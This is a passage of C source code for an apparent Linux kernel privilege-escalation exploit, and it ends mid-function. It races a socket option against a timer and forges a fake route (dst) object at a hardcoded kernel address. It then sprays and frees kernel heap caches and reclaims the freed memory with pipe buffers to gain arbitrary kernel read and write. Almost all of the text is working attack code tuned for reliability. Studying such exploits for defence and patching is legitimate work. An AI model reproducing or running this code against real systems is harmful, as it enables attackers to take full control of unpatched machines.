            FUTEX_WAIT_PRIVATE,
            0,
            NULL,
            NULL,
            0);
        if (rc == -1 && errno != EAGAIN && errno != EINTR) {
            LOG("cpu1 blocker futex wait failed errno=%d", errno);
            sleep_us_checked(1000);
        }
    }
}

void *run_cpu1_block_thread(void *arg) {
    Cpu1BlockerArg *blocker = (Cpu1BlockerArg *) arg;
    TriggerCtx *ctx = blocker->ctx;
    usize index = blocker->index;
    bool use_rt = env_usize("BAD_DST_CPU1_BLOCK_RT", 1);

    pin_to_cpu(1);
    if (use_rt) {
        int priority = (int) env_usize("BAD_DST_CPU1_BLOCK_RT_PRIO", 80);
        try_make_thread_fifo(index == 0 ? "cpu1 blocker" : "cpu1 blocker extra", priority);
    } else if (index == 0) {
        LOG("cpu1 blockers: using normal CFS spinner threads");
    }

    atomic_fetch_add(&ctx->cpu1_blocker_ready_counter, 1);
    if (index == 0) {
        atomic_fetch_add(&ctx->ready_counter, 1);
    }

    for (;;) {
        while (atomic_load(&ctx->cpu1_block)) {}
        wait_cpu1_blocker_released(ctx);
    }
}

void *run_trigger_thread(void *arg) {
    TriggerCtx *ctx = (TriggerCtx *) arg;
    atomic_store(&ctx->trigger_thread, syscall(SYS_gettid));

    pin_to_cpu(0);
    make_thread_idle();

    // retry race in loop
    for (;;) {
        // wait with pipe, needed also because timer could fire in weird spots
        // where ready counter is still 2
        u8 buf = 0;
        SYSCHK(read(ctx->sync_pipe_to_trigger.read_fd, &buf, sizeof(buf)));

        // wait for other threads to be ready
        while (atomic_load(&ctx->ready_counter) < 2) {}

        // ensure we are on cpu 0 (should already be done)
        pin_to_cpu(0);

        // wait a bit more just in case
        // for (usize i = 0; i < 1024 * 1024; i++) {}

        // read socket fd before setting timer, if timer expires before setsockopt main thread might change socket
        int socket_fd = atomic_load(&ctx->vuln_socket);

        // arm timer
        struct itimerspec spec = { 0 };
        spec.it_value = ns_to_timespec(now_ns() + ctx->timer_offset);
        SYSCHK(timerfd_settime(ctx->timer_fd, TFD_TIMER_ABSTIME, &spec, NULL));

        int one = 1;
        // don't check result, socket might be closed
        setsockopt(socket_fd, SOL_SOCKET, SO_CNX_ADVICE, &one, sizeof(one));
        atomic_fetch_add(&ctx->trigger_done_counter, 1);
    }
}

bool wait_for_trigger_done(TriggerCtx *ctx, u64 done_before, usize timeout_us) {
    u64 deadline = now_ns() + timeout_us * 1000ull;

    for (;;) {
        if ((u64) atomic_load(&ctx->trigger_done_counter) > done_before) {
            return true;
        }
        if (now_ns() >= deadline) {
            return false;
        }
        sleep_us_checked(1000);
    }
}

void drain_timerfd(int timer_fd) {
    u64 result = 0;

    for (;;) {
        ssize_t got = read(timer_fd, &result, sizeof(result));
        if (got == (ssize_t) sizeof(result)) {
            continue;
        }
        if (got == -1 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
            return;
        }
        if (got == -1 && errno == EINTR) {
            continue;
        }

        LOG("timerfd drain failed: got=%ld errno=%d", (long) got, errno);
        return;
    }
}

bool read_timerfd_expiration(int timer_fd, u64 *result, usize timeout_us) {
    struct pollfd pfd = {
        .fd = timer_fd,
        .events = POLLIN,
    };
    int timeout_ms = (int) ((timeout_us + 999) / 1000);
    if (timeout_ms < 1) {
        timeout_ms = 1;
    }

    for (;;) {
        int rc = poll(&pfd, 1, timeout_ms);
        if (rc == 0) {
            return false;
        }
        if (rc == -1 && errno == EINTR) {
            continue;
        }
        if (rc == -1) {
            LOG("timerfd poll failed errno=%d", errno);
            return false;
        }
        break;
    }

    for (;;) {
        ssize_t got = read(timer_fd, result, sizeof(*result));
        if (got == (ssize_t) sizeof(*result)) {
            return true;
        }
        if (got == -1 && errno == EINTR) {
            continue;
        }
        if (got == -1 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
            return false;
        }

        LOG("timerfd read failed: got=%ld errno=%d", (long) got, errno);
        return false;
    }
}

bool release_frozen_trigger(TriggerCtx *ctx, pid_t trigger_pid, u64 done_before) {
    set_cpu1_block_state(ctx, 0);
    pin_thread_to_cpu(trigger_pid, 1);

    bool done = wait_for_trigger_done(
        ctx,
        done_before,
        env_usize("BAD_DST_TRIGGER_RELEASE_TIMEOUT_US", 200000));

    set_cpu1_block_state(ctx, 1);
    return done;
}

void pulse_frozen_trigger(TriggerCtx *ctx, pid_t trigger_pid, u64 pulse_ns) {
    if (pulse_ns == 0) {
        return;
    }

    LOG("race pulse on cpu1: %lu ns", pulse_ns);
    trace_marker("attempt=%lu stage=pulse_start pulse_ns=%lu",
        trace_marker_attempt, pulse_ns);

    set_cpu1_block_state(ctx, 0);
    pin_thread_to_cpu(trigger_pid, 1);
    spin_wait_ns(pulse_ns);
    set_cpu1_block_state(ctx, 1);

    u64 settle_ns = env_usize("BAD_DST_RACE_PULSE_SETTLE_NS", 100000);
    spin_wait_ns(settle_ns);
    trace_marker("attempt=%lu stage=pulse_end settle_ns=%lu",
        trace_marker_attempt, settle_ns);
}

bool try_run_main_exploit(TriggerCtx *ctx, ExploitPipeSet *prepared_pipes);

// Define DEBUG to use the local SO_CNX_ADVICE==67 harness instead of the real race.
// #define DEBUG

void trigger_vuln_loop() {
    // pretrigger rtable object for incomming icmp packets to be allocated before spray
    int peer_socket_fd = open_connected_ipv4_udp_socket(PEER_ADDR, 6767);
    // force regular send and recv routes to be created
    u8 tmp_buf = 67;
    SYSCHK(write(peer_socket_fd, &tmp_buf, sizeof(tmp_buf)));
    SYSCHK(read(peer_socket_fd, &tmp_buf, sizeof(tmp_buf)));

    // setup spray threads before anything else
    setup_spray();
    setup_smp_allocator_grooming();

    bool use_rt_blocker = env_usize("BAD_DST_CPU1_BLOCK_RT", 1);
    usize cpu1_block_thread_count = env_usize(
        "BAD_DST_CPU1_BLOCK_THREADS",
        use_rt_blocker ? 1 : 64);
    cpu1_block_thread_count = min_usize(cpu1_block_thread_count, MAX_CPU1_BLOCK_THREADS);
    if (cpu1_block_thread_count == 0) {
        cpu1_block_thread_count = 1;
    }
    bool fast_critical_path = env_usize("BAD_DST_FAST_CRITICAL", 0);
    usize pre_race_expire_us = env_usize(
        "BAD_DST_PRE_RACE_EXPIRE_US",
        fast_critical_path ? 1200000 : 0);
    bool prepare_pipes_before_race = env_usize(
        "BAD_DST_PREPARE_PIPES_BEFORE_RACE",
        0);
    bool prepare_page_pipes_before_race = env_usize(
        "BAD_DST_PREPARE_PAGE_PIPES_BEFORE_RACE",
        0);
    bool expire_with_lookup_only = env_usize(
        "BAD_DST_EXPIRE_WITH_LOOKUP_ONLY",
        pre_race_expire_us ? 1 : 0);
    usize fnhe_expire_total_us = env_usize("BAD_DST_FNHE_EXPIRE_TOTAL_US", 0);
    usize post_race_sleep_default_us = pre_race_expire_us ? 0 : 2000000;
    usize post_race_expire_default_us = pre_race_expire_us ? 0 : 1000000;

    pthread_t cpu1_block_threads[MAX_CPU1_BLOCK_THREADS] = { 0 };
    Cpu1BlockerArg cpu1_block_args[MAX_CPU1_BLOCK_THREADS] = { 0 };
    pthread_t trigger_thread = { 0 };

    TriggerCtx ctx = {
        .ready_counter = 0,
        .cpu1_block = 1,
        .cpu1_blocker_ready_counter = 0,
        .timer_fd = SYSCHK(timerfd_create(CLOCK_MONOTONIC, TFD_CLOEXEC | TFD_NONBLOCK)),
        .vuln_socket = 0,
        .pre_sockets = { 0 },
        .post_sockets = { 0 },
        .pre_socket_count = NUM_BASE_PRE_SOCKETS,
        .post_socket_count = NUM_POST_SOCKETS,
        .align_pad = 0,
        .trigger_thread = 0,
        .trigger_done_counter = 0,
        .sync_pipe_to_trigger = open_pipe(),
        .timer_offset = env_usize("BAD_DST_TIMER_INITIAL_NS", 20000),
        .critical_start_ns = 0,
    };

#ifndef DEBUG
    LOG("cpu1 blocker setup: mode=%s threads=%lu",
        use_rt_blocker ? "rt" : "cfs", cpu1_block_thread_count);

    pthread_attr_t cpu1_block_attr;
    SYSCHK(pthread_attr_init(&cpu1_block_attr));
    usize blocker_stack_size = env_usize("BAD_DST_CPU1_BLOCK_STACK", 65536);
    if (blocker_stack_size < 16384) {
        blocker_stack_size = 16384;
    }
    int attr_rc = pthread_attr_setstacksize(&cpu1_block_attr, blocker_stack_size);
    if (attr_rc != 0) {
        LOG("cpu1 blocker stack size %lu rejected errno=%d", blocker_stack_size, attr_rc);
    }
    attr_rc = pthread_attr_setguardsize(&cpu1_block_attr, 0);
    if (attr_rc != 0) {
        LOG("cpu1 blocker guard size rejected errno=%d", attr_rc);
    }

    // These threads spin on CPU1 to keep the migrated trigger from resuming.
    for (usize i = 0; i < cpu1_block_thread_count; i++) {
        cpu1_block_args[i].ctx = &ctx;
        cpu1_block_args[i].index = i;
        SYSCHK(pthread_create(&cpu1_block_threads[i], &cpu1_block_attr,
                              run_cpu1_block_thread,
                              (void *) &cpu1_block_args[i]));
    }
    SYSCHK(pthread_attr_destroy(&cpu1_block_attr));
    while ((usize) atomic_load(&ctx.cpu1_blocker_ready_counter) < cpu1_block_thread_count) {}

    // create the trigger thread
    SYSCHK(pthread_create(&trigger_thread, NULL, run_trigger_thread, (void *) &ctx));

    // wait for trigger thread tid to become available
    while (atomic_load(&ctx.trigger_thread) == 0) {}
    pid_t trigger_pid = atomic_load(&ctx.trigger_thread);
#endif

    usize iteration_count = 0;
    usize too_long_count = 0;

#ifdef DEBUG
    LOG("start vuln loop");
    usize max_attempts = env_usize("BAD_DST_MAX_ATTEMPTS", 0);
    usize fixed_align_pad = env_usize("BAD_DST_ALIGN_PAD", (usize)-1);

    for (usize attempt = 1; max_attempts == 0 || attempt <= max_attempts; attempt++) {
        usize align_pad = fixed_align_pad == (usize)-1 ?
            ((attempt - 1) % NUM_ALIGN_PAD_SOCKETS) :
            (fixed_align_pad % NUM_ALIGN_PAD_SOCKETS);

        ctx.pre_socket_count = NUM_BASE_PRE_SOCKETS + align_pad;
        ctx.post_socket_count = NUM_POST_SOCKETS;
        ctx.align_pad = align_pad;
        ExploitPipeSet prepared_pipes = { 0 };

        LOG("start trigger attempt=%lu align_pad=%lu pre=%lu post=%lu",
            attempt, align_pad, ctx.pre_socket_count, ctx.post_socket_count);

        open_many_sockets(ctx.pre_sockets, ctx.pre_socket_count);
        ctx.vuln_socket = open_vuln_ipv4_udp_socket();
        u64 vuln_ready_ns = now_ns();

        if (prepare_pipes_before_race) {
            prepare_exploit_pipes(&prepared_pipes);
        } else if (prepare_page_pipes_before_race) {
            prepare_page_pipes(&prepared_pipes);
        }
        sleep_until_elapsed_us(vuln_ready_ns, pre_race_expire_us);

        int sixseven = 67;
        // int sixnine = 69;
        // SYSCHK(setsockopt(ctx.vuln_socket, SOL_SOCKET, SO_CNX_ADVICE, &sixnine, sizeof(sixnine)));
        SYSCHK(setsockopt(ctx.vuln_socket, SOL_SOCKET, SO_CNX_ADVICE, &sixseven, sizeof(sixseven)));
        LOG("debug triggered");

        open_many_sockets(ctx.post_sockets, ctx.post_socket_count);

        sleep_us_checked(env_usize("BAD_DST_POST_RACE_SLEEP_US", post_race_sleep_default_us));
        if (fnhe_expire_total_us != 0) {
            sleep_until_elapsed_us(vuln_ready_ns, fnhe_expire_total_us);
        }
        // trigger invalidation of mtu entry
        trigger_expired_fnhe_cleanup(expire_with_lookup_only);
        sleep_us_checked(env_usize("BAD_DST_POST_RACE_EXPIRE_US", post_race_expire_default_us));

        ctx.critical_start_ns = now_ns();
        if (try_run_main_exploit(&ctx, &prepared_pipes)) {
            return;
        }

        // also prepare spray again
        reset_spray();
    }

    LOG("FAIL: reached BAD_DST_MAX_ATTEMPTS without corrupting a pipe");
    for (;;) {
        sleep(1000);
    }
#else
    LOG("start real race loop");
    usize max_attempts = env_usize("BAD_DST_MAX_ATTEMPTS", 0);
    usize fixed_align_pad = env_usize("BAD_DST_ALIGN_PAD", (usize)-1);
    usize lock_oracle_timeout_us = env_usize("BAD_DST_LOCK_ORACLE_US", 50000);
    bool use_lock_oracle = env_usize("BAD_DST_LOCK_ORACLE", 1);
    bool use_stack_oracle = env_usize("BAD_DST_STACK_ORACLE", 0);
    bool require_stack_target = env_usize("BAD_DST_REQUIRE_STACK_TARGET", 0);
    bool use_done_oracle = env_usize("BAD_DST_DONE_ORACLE", 1);
    usize done_oracle_settle_us = env_usize("BAD_DST_DONE_ORACLE_SETTLE_US", 0);

    for (usize attempt = 1; max_attempts == 0 || attempt <= max_attempts; attempt++) {
        ctx.timer_offset = timer_offset_for_attempt(ctx.timer_offset, attempt);

        usize align_pad = fixed_align_pad == (usize)-1 ?
            ((attempt - 1) % NUM_ALIGN_PAD_SOCKETS) :
            (fixed_align_pad % NUM_ALIGN_PAD_SOCKETS);

        ctx.pre_socket_count = NUM_BASE_PRE_SOCKETS + align_pad;
        ctx.post_socket_count = NUM_POST_SOCKETS;
        ctx.align_pad = align_pad;
        ExploitPipeSet prepared_pipes = { 0 };

        LOG("start real race attempt=%lu align_pad=%lu pre=%lu post=%lu timer_offset=%lu",
            attempt, align_pad, ctx.pre_socket_count, ctx.post_socket_count, ctx.timer_offset);
        trace_marker_attempt = attempt;
        trace_marker("attempt=%lu stage=start align=%lu pre=%lu post=%lu timer=%lu",
            attempt, align_pad, ctx.pre_socket_count, ctx.post_socket_count, ctx.timer_offset);
        drain_timerfd(ctx.timer_fd);

        open_many_sockets(ctx.pre_sockets, ctx.pre_socket_count);
        ctx.vuln_socket = open_vuln_ipv4_udp_socket();
        u64 vuln_ready_ns = now_ns();
        trace_marker("attempt=%lu stage=vuln_socket_open fd=%d", attempt, ctx.vuln_socket);

        if (prepare_pipes_before_race) {
            prepare_exploit_pipes(&prepared_pipes);
        } else if (prepare_page_pipes_before_race) {
            prepare_page_pipes(&prepared_pipes);
        }
        sleep_until_elapsed_us(vuln_ready_ns, pre_race_expire_us);
        trace_marker("attempt=%lu stage=pre_race_ready pre_expire_us=%lu prepared_pipes=%d",
            attempt, pre_race_expire_us, exploit_pipe_set_has_active(&prepared_pipes));

        u64 trigger_done_before = (u64) atomic_load(&ctx.trigger_done_counter);
        set_cpu1_block_state(&ctx, 1);

        // let trigger know it can continue another iteration
        u8 buf = 0;
        SYSCHK(write(ctx.sync_pipe_to_trigger.write_fd, &buf, sizeof(buf)));

        // sets up trigger thread to run and trigger exploit
        pin_thread_to_cpu(trigger_pid, 0);

        trace_marker("attempt=%lu stage=before_timer_read", attempt);

        // trigger actual exploit (will context switch to trigger thread)
        atomic_fetch_add(&ctx.ready_counter, 1);
        u64 result = 0;
        usize timer_read_timeout_us = env_usize("BAD_DST_TIMER_READ_TIMEOUT_US", 1000000);
        if (!read_timerfd_expiration(ctx.timer_fd, &result, timer_read_timeout_us)) {
            atomic_fetch_sub(&ctx.ready_counter, 1);
            LOG("timerfd read timeout after %lu us; retrying race attempt", timer_read_timeout_us);
            trace_marker("attempt=%lu stage=timer_read_timeout timeout_us=%lu",
                attempt, timer_read_timeout_us);

            (void) release_frozen_trigger(&ctx, trigger_pid, trigger_done_before);
            SYSCHK(close(ctx.vuln_socket));
            close_fds(ctx.pre_sockets, ctx.pre_socket_count);
            close_prepared_exploit_pipes(&prepared_pipes, false, "timer timeout");
            reset_spray();
            continue;
        }
        atomic_fetch_sub(&ctx.ready_counter, 1); // no longer ready
        trace_marker("attempt=%lu stage=after_timer_read result=%lu",
            attempt, result);

        // move trigger thread to cpu, so we can sleep and such and not worry about blocking
        int pin_rc = pin_thread_to_cpu(trigger_pid, 1);
        int pin_errno = errno;
        trace_marker("attempt=%lu stage=after_pin_trigger rc=%d errno=%d",
            attempt, pin_rc, pin_errno);

        iteration_count += 1;

        u64 pulse_ns = race_pulse_ns_for_attempt(attempt);
        if (pulse_ns != 0) {
            pulse_frozen_trigger(&ctx, trigger_pid, pulse_ns);
        }

        if (use_done_oracle) {
            sleep_us_checked(done_oracle_settle_us);
            if ((u64) atomic_load(&ctx.trigger_done_counter) > trigger_done_before) {
                LOG("race miss after timer: trigger already returned");
                trace_marker("attempt=%lu stage=trigger_already_done", attempt);
                adjust_timer_offset(&ctx.timer_offset, STACK_ORACLE_TOO_LATE_FAR);

                SYSCHK(close(ctx.vuln_socket));
                close_fds(ctx.pre_sockets, ctx.pre_socket_count);
                close_prepared_exploit_pipes(&prepared_pipes, false, "trigger already done");
                reset_spray();

                continue;
            }
        }

        StackOracleState stack_state = STACK_ORACLE_UNKNOWN;
        if (use_stack_oracle) {
            stack_state = read_trigger_stack_oracle(trigger_pid);
        }
        trace_marker("attempt=%lu stage=stack_oracle state=%s",
            attempt, stack_oracle_state_name(stack_state));

        LockOracleResult lock_oracle = {
            .state = LOCK_ORACLE_BLOCKED,
            .pid = -1,
            .result_errno = 0,
        };
        if (use_lock_oracle) {
            lock_oracle = run_ip_mtu_lock_oracle(ctx.vuln_socket, lock_oracle_timeout_us);
        }
        LOG("lock oracle: %s errno=%d pid=%d",
            use_lock_oracle ? lock_oracle_state_name(lock_oracle.state) : "skipped",
            lock_oracle.result_errno,
            lock_oracle.pid);
        trace_marker("attempt=%lu stage=lock_oracle state=%s errno=%d pid=%d",
            attempt,
            use_lock_oracle ? lock_oracle_state_name(lock_oracle.state) : "skipped",
            lock_oracle.result_errno,
            lock_oracle.pid);

        if (lock_oracle.state != LOCK_ORACLE_BLOCKED) {
            StackOracleState reason = lock_oracle.result_errno == ENOTCONN ?
                STACK_ORACLE_TOO_LATE : STACK_ORACLE_TOO_EARLY;
            if (use_stack_oracle &&
                (stack_state == STACK_ORACLE_TOO_EARLY ||
                 stack_state == STACK_ORACLE_TOO_EARLY_NEAR ||
                 stack_state == STACK_ORACLE_TOO_LATE ||
                 stack_state == STACK_ORACLE_TOO_LATE_FAR)) {
                reason = stack_state;
            }
            LOG("race miss before freeze: %s", stack_oracle_state_name(reason));
            trace_marker("attempt=%lu stage=miss_before_freeze reason=%s",
                attempt, stack_oracle_state_name(reason));
            adjust_timer_offset(&ctx.timer_offset, reason);
            if (!release_frozen_trigger(&ctx, trigger_pid, trigger_done_before)) {
                LOG("FAIL: trigger did not release after early/late miss");
                for (;;) {
                    sleep(1000);
                }
            }
            SYSCHK(close(ctx.vuln_socket));
            close_fds(ctx.pre_sockets, ctx.pre_socket_count);
            close_prepared_exploit_pipes(&prepared_pipes, false, "miss before freeze");
            reset_spray();

            continue;
        }

        if (use_stack_oracle &&
            (stack_state == STACK_ORACLE_TOO_EARLY ||
             stack_state == STACK_ORACLE_TOO_EARLY_NEAR ||
             stack_state == STACK_ORACLE_TOO_LATE ||
             stack_state == STACK_ORACLE_TOO_LATE_FAR ||
             (require_stack_target && stack_state != STACK_ORACLE_TARGET))) {
            LOG("race miss after freeze: %s", stack_oracle_state_name(stack_state));
            trace_marker("attempt=%lu stage=miss_after_freeze reason=%s",
                attempt, stack_oracle_state_name(stack_state));
            adjust_timer_offset(&ctx.timer_offset, stack_state);
            if (!release_frozen_trigger(&ctx, trigger_pid, trigger_done_before)) {
                LOG("FAIL: trigger did not release after stack-classified miss");
                for (;;) {
                    sleep(1000);
                }
            }
            wait_for_child_exit(lock_oracle.pid, env_usize("BAD_DST_LOCK_ORACLE_REAP_US", 200000));
            SYSCHK(close(ctx.vuln_socket));
            close_fds(ctx.pre_sockets, ctx.pre_socket_count);
            close_prepared_exploit_pipes(&prepared_pipes, false, "miss after freeze");
            reset_spray();

            continue;
        }

        LOG("race candidate: lock held with stack=%s", stack_oracle_state_name(stack_state));
        trace_marker("attempt=%lu stage=candidate stack=%s",
            attempt, stack_oracle_state_name(stack_state));
        ctx.critical_start_ns = now_ns();

        open_many_sockets(ctx.post_sockets, ctx.post_socket_count);

        sleep_us_checked(env_usize("BAD_DST_POST_RACE_SLEEP_US", post_race_sleep_default_us));
        if (fnhe_expire_total_us != 0) {
            sleep_until_elapsed_us(vuln_ready_ns, fnhe_expire_total_us);
        }
        trigger_expired_fnhe_cleanup(expire_with_lookup_only);
        sleep_us_checked(env_usize("BAD_DST_POST_RACE_EXPIRE_US", post_race_expire_default_us));

        LOG("\nrun exploit...");
        trace_marker("attempt=%lu stage=run_exploit", attempt);

        // try exploit: race may or may not have succeeded
        if (try_run_main_exploit(&ctx, &prepared_pipes)) {
            return;
        }

        LOG("race candidate did not reach pipe corruption; releasing trigger for retry");
        trace_marker("attempt=%lu stage=candidate_pipe_fail_release", attempt);
        if (!release_frozen_trigger(&ctx, trigger_pid, trigger_done_before)) {
            LOG("FAIL: trigger did not release after failed candidate");
            for (;;) {
                sleep(1000);
            }
        }
        wait_for_child_exit(lock_oracle.pid, env_usize("BAD_DST_LOCK_ORACLE_REAP_US", 200000));
        SYSCHK(close(ctx.vuln_socket));

        // also prepare spray again
        reset_spray();
    }

    LOG("FAIL: reached BAD_DST_MAX_ATTEMPTS without winning real race");
    for (;;) {
        sleep(1000);
    }
#endif
}

bool select_fake_dst_offset(TriggerCtx *ctx, usize *fake_dst_offset) {
    static usize rotate_counter = 0;

    if (env_usize("BAD_DST_FAKE_DST_OFFSET_ROTATE", 0)) {
        usize offset = (rotate_counter++ & 1) ? 128 : 64;

        LOG("rotating fake dst offset: candidate=%lu offset=%lu",
            rotate_counter, offset);
        trace_marker("attempt=%lu stage=rotate_fake_dst candidate=%lu offset=%lu",
            trace_marker_attempt, rotate_counter, offset);

        *fake_dst_offset = offset;
        return true;
    }

    if (!env_usize("BAD_DST_FAKE_DST_OFFSET_AUTO", 0)) {
        *fake_dst_offset = env_usize("BAD_DST_FAKE_DST_OFFSET", 64);
        return true;
    }

    usize bias = env_usize("BAD_DST_FAKE_DST_ALIGN_BIAS", 3);
    usize align_class = (ctx->align_pad + bias) & 3;
    usize offset = align_class * 64;

    LOG("auto fake dst offset: align_pad=%lu bias=%lu class=%lu offset=%lu",
        ctx->align_pad, bias, align_class, offset);
    trace_marker("attempt=%lu stage=auto_fake_dst align=%lu bias=%lu class=%lu offset=%lu",
        trace_marker_attempt, ctx->align_pad, bias, align_class, offset);

    if (offset == 0 || offset == 192) {
        LOG("skip candidate: unusable fake dst offset %lu for align_pad=%lu",
            offset, ctx->align_pad);
        trace_marker("attempt=%lu stage=skip_unusable_fake_dst align=%lu offset=%lu",
            trace_marker_attempt, ctx->align_pad, offset);
        return false;
    }

    *fake_dst_offset = offset;
    return true;
}

void build_fake_dst_payload(u8 *control_payload, usize fake_dst_offset, usize fake_dst_ops) {
    // cannot use offset 0 because cmsg_len occupies dst->dev.
    // cannot use offset 192 because dst->__refcnt overlaps the next cmsg_len.
    if (fake_dst_offset + sizeof(struct metadata_dst) > SPRAY_SIZE) {
        panic("BAD_DST_FAKE_DST_OFFSET out of payload range");
    }

    init_control_payload(control_payload);

    struct metadata_dst *dst_entry = (struct metadata_dst *) (control_payload + fake_dst_offset);
    dst_entry->dst.dev = NULL;
    dst_entry->dst.obsolete = env_usize("BAD_DST_FAKE_DST_OBSOLETE", 1);
    dst_entry->dst.__refcnt.counter = env_usize("BAD_DST_FAKE_DST_REFCNT", 1);
    dst_entry->dst.ops = (struct dst_ops *) fake_dst_ops;
    dst_entry->dst.flags = env_usize("BAD_DST_FAKE_DST_FLAGS", 0xffff);
    // just has to not be 0 (METADATA_IP_TUNNEL)
    dst_entry->type = env_usize("BAD_DST_FAKE_DST_TYPE", METADATA_HW_PORT_MUX);
}

void log_fake_dst_payload(const char *mode, usize fake_dst_offset, usize fake_dst_ops, u8 *control_payload) {
    struct metadata_dst *dst_entry = (struct metadata_dst *) (control_payload + fake_dst_offset);

    LOG("fake dst%s: payload_offset=%lu ops=0x%lx obsolete=%d refcnt=%d flags=0x%x type=%u",
        mode,
        fake_dst_offset,
        fake_dst_ops,
        dst_entry->dst.obsolete,
        dst_entry->dst.__refcnt.counter,
        dst_entry->dst.flags,
        dst_entry->type);
    trace_marker("attempt=%lu stage=fake_dst%s offset=%lu ops=0x%lx refcnt=%d obsolete=%d",
        trace_marker_attempt,
        mode,
        fake_dst_offset,
        fake_dst_ops,
        dst_entry->dst.__refcnt.counter,
        dst_entry->dst.obsolete);
}

// returns false on failure, should be retried
bool try_run_main_exploit(TriggerCtx *ctx, ExploitPipeSet *prepared_pipes) {
    bool smp = online_cpu_count() > 1;
    usize fake_dst_offset = 0;
    bool mixed_fake_dst = env_usize("BAD_DST_FAKE_DST_OFFSET_MIX", smp ? 1 : 0);

    if (!mixed_fake_dst && !select_fake_dst_offset(ctx, &fake_dst_offset)) {
        close_prepared_exploit_pipes(prepared_pipes, false, "fake dst offset skip");
        close_fds(ctx->pre_sockets, ctx->pre_socket_count);
        close_fds(ctx->post_sockets, ctx->post_socket_count);
        return false;
    }

    ExploitPipeSet local_pipes = { 0 };
    ExploitPipeSet *pipe_set = exploit_pipe_set_has_active(prepared_pipes) ?
        prepared_pipes : &local_pipes;
    bool using_prepared_pipes = pipe_set == prepared_pipes;
    if (!pipe_set->active) {
        prepare_exploit_pipes(pipe_set);
    } else {
        LOG("use prepared pipes... page=%lu vuln=%lu",
            pipe_set->page_pipe_count, pipe_set->vuln_pipe_count);
        trace_marker("attempt=%lu stage=use_prepared_pipes page=%lu vuln=%lu",
            trace_marker_attempt, pipe_set->page_pipe_count, pipe_set->vuln_pipe_count);
    }

    Pipe *page_pipes = pipe_set->page_pipes;
    Pipe *vuln_pipes = pipe_set->vuln_pipes;
    usize page_pipe_count = pipe_set->page_pipe_count;
    usize vuln_pipe_count = pipe_set->vuln_pipe_count;

    LOG("rt6_info cross cache free...");
    trace_marker("attempt=%lu stage=close_prepost", trace_marker_attempt);
    // close many sockets, hopefully buddy allocator reclaims backing page
    close_fds(ctx->pre_sockets, ctx->pre_socket_count);
    close_fds(ctx->post_sockets, ctx->post_socket_count);

    // cause rcu to free rt6 info
    wait_for_rcu_callbacks("rtable free", "BAD_DST_RTABLE_RCU_US", 1000000);
    trace_marker("attempt=%lu stage=after_rtable_rcu", trace_marker_attempt);
    churn_kmalloc192_after_rtable_free();

    usize fake_dst_ops = env_usize("BAD_DST_FAKE_DST_OPS", 0xffffffff836a9c40);
    if (mixed_fake_dst) {
        LOG("mixed fake dst payloads enabled: offsets=64,128");
        trace_marker("attempt=%lu stage=fake_dst_mix offsets=64,128", trace_marker_attempt);
        build_fake_dst_payload(payload_variants[0], 64, fake_dst_ops);
        build_fake_dst_payload(payload_variants[1], 128, fake_dst_ops);
        log_fake_dst_payload("[mix0]", 64, fake_dst_ops, payload_variants[0]);
        log_fake_dst_payload("[mix1]", 128, fake_dst_ops, payload_variants[1]);
        atomic_store(&spray_payload_variant_count, 2);
    } else {
        build_fake_dst_payload(payload, fake_dst_offset, fake_dst_ops);
        log_fake_dst_payload("", fake_dst_offset, fake_dst_ops, payload);
        atomic_store(&spray_payload_variant_count, 0);
    }

    // after spray, dst_cache hopefully reclaimed
    LOG("spray kmalloc-256...");
    trace_marker("attempt=%lu stage=before_spray", trace_marker_attempt);
    do_spray();
    trace_marker("attempt=%lu stage=after_spray", trace_marker_attempt);

    // MSG_PROBE still exercises sk_dst_check(), but avoids ip_setup_cork()
    // dereferencing a bad stale route on failed alignment attempts.
    LOG("trigger kmalloc-256 invalid free...");
    if (ctx->critical_start_ns != 0) {
        usize elapsed_us = (now_ns() - ctx->critical_start_ns) / 1000;
        LOG("critical elapsed before MSG_PROBE: %lu us", elapsed_us);
        trace_marker("attempt=%lu stage=critical_before_msg_probe elapsed_us=%lu prepared=%d",
            trace_marker_attempt, elapsed_us, using_prepared_pipes);
    }
    trace_marker("attempt=%lu stage=before_msg_probe", trace_marker_attempt);
    u8 buf = 0;
    SYSCHK(send(ctx->vuln_socket, &buf, sizeof(buf), MSG_PROBE));
    trace_marker("attempt=%lu stage=after_msg_probe", trace_marker_attempt);

    // Wait for the fake dst_release() call_rcu() path to actually free.
    wait_for_rcu_callbacks("fake dst free", "BAD_DST_FAKE_DST_RCU_US", 1000000);
    trace_marker("attempt=%lu stage=after_fake_dst_rcu", trace_marker_attempt);

    // change vuln pipe buffer to put them in kmalloc-256
    // will hopefully cause pipe to fill freed slot in sprayed object
    LOG("reclaim with struct pipe_buffer_t...");
    trace_marker("attempt=%lu stage=before_pipe_resize", trace_marker_attempt);
    for (usize i = 0; i < vuln_pipe_count; i++) {
        pipe_set_buf_size(&vuln_pipes[i], 4 * 0x1000);
    }
    verify_vuln_pipes_active(vuln_pipes, vuln_pipe_count, "post resize");

    bool fill_vuln_pipe_ring = env_usize("BAD_DST_FILL_VULN_PIPE_RING", 1);
    usize active_slots_before_probe = fill_vuln_pipe_ring ? 3 : 1;
    if (fill_vuln_pipe_ring) {
        for (usize i = 0; i < vuln_pipe_count; i++) {
            pipe_fill_three_active_buffers(&vuln_pipes[i]);
        }
        trace_marker("attempt=%lu stage=after_fill_vuln_pipe_ring",
            trace_marker_attempt);
    }
    trace_marker("attempt=%lu stage=after_pipe_resize", trace_marker_attempt);

    // trigger all sprayed objects to be freed
    // will trigger a page with vuln pipe to be freed
    LOG("kmalloc-256 cross cache free...");
    trace_marker("attempt=%lu stage=before_free_spray", trace_marker_attempt);
    free_spray();
    trace_marker("attempt=%lu stage=after_free_spray", trace_marker_attempt);

    // attempt to reclaim vuln pipe with another pipe backing page
    LOG("reclaim with pipe buffer backing page...");
    trace_marker("attempt=%lu stage=before_pipe_page_reclaim", trace_marker_attempt);
    u8 buf2[0x1000] = { 0 };
    memset(buf2, 'A', sizeof(buf2));
    reclaim_pipe_pages(page_pipes, page_pipe_count, buf2);
    trace_marker("attempt=%lu stage=after_pipe_page_reclaim", trace_marker_attempt);

    // find corrupted pipe
    LOG("setup arbitrary read/write...");
    CorruptPipeCandidate corrupt_pipe = { 0 };
    bool have_corrupt_pipe = false;
    usize corrupt_min = env_usize("BAD_DST_PIPE_CORRUPT_FIONREAD_MIN", 0x1000000);
    have_corrupt_pipe = find_corrupted_pipe(vuln_pipes, vuln_pipe_count,
                                            corrupt_min, &corrupt_pipe);

    if (!have_corrupt_pipe) {
